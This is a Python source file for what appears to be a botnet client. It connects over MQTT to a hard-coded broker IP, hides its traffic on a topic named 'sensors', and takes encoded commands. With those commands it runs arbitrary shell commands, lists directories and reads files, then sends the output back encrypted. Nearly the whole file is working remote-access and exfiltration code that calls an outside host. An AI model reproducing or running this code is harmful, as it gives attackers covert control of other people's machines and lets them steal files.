import paho.mqtt.client as mqtt
import subprocess
import socket
from AESCipher import *
from config import *

cipher = AESCipher()
bot_id = socket.gethostname()
waiting_for_param = None  
def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Error: {str(e)}"


def on_message(client, userdata, message):
    global waiting_for_param
    
    try:
        payload = message.payload
        
        if isinstance(payload, bytes):
            payload_str = payload.decode('utf-8')
        else:
            payload_str = str(payload)
        
        if payload_str.isdigit() and is_valid_command(payload_str):
            cmd_type = decode_command(payload_str)
            if cmd_type:
                print(f"Received command code: {payload_str} -> {cmd_type}")
                
                if cmd_type in ['CMD:ls', 'COPY', 'EXEC']:
                    waiting_for_param = cmd_type
                    return
                
                response = ""
                if cmd_type == "ANNOUNCE":
                    response = f"BOT_ALIVE:{bot_id}"
                elif cmd_type == "CMD:w":
                    response = execute_command("w")
                elif cmd_type == "CMD:id":
                    response = execute_command("id")
                
                if response:
                    client.publish("sensors", cipher.encrypt(response), qos=1)
            return
        
        if payload_str.isdigit():
            return
        
        if waiting_for_param:
            try:
                param = cipher.decrypt(payload)
                print(f"Received parameter for {waiting_for_param}: {param}")
                
                response = ""
                if waiting_for_param == "CMD:ls":
                    response = execute_command(f"ls {param}")
                elif waiting_for_param == "COPY":
                    try:
                        with open(param, 'r') as f:
                            response = f"FILE:{param}\n{f.read()}"
                    except Exception as e:
                        response = f"Error reading file: {str(e)}"
                elif waiting_for_param == "EXEC":
                    response = execute_command(param)
                
                waiting_for_param = None
                
                if response:
                    client.publish("sensors", cipher.encrypt(response), qos=1)
            except:
                waiting_for_param = None
    except Exception as e:
        None

def on_subscribe(client, userdata, mid, reason_code_list, properties):
    if reason_code_list[0].is_failure:
        print(f"Broker rejected subscription: {reason_code_list[0]}")
    else:
        print(f"Subscribed with QoS: {reason_code_list[0].value}")

def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code.is_failure:
        print(f"Failed to connect: {reason_code}")
    else:
        client.subscribe("sensors")

mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
mqttc.on_connect = on_connect
mqttc.on_message = on_message
mqttc.on_subscribe = on_subscribe
mqttc.connect("147.32.82.209", 1883)
mqttc.loop_forever()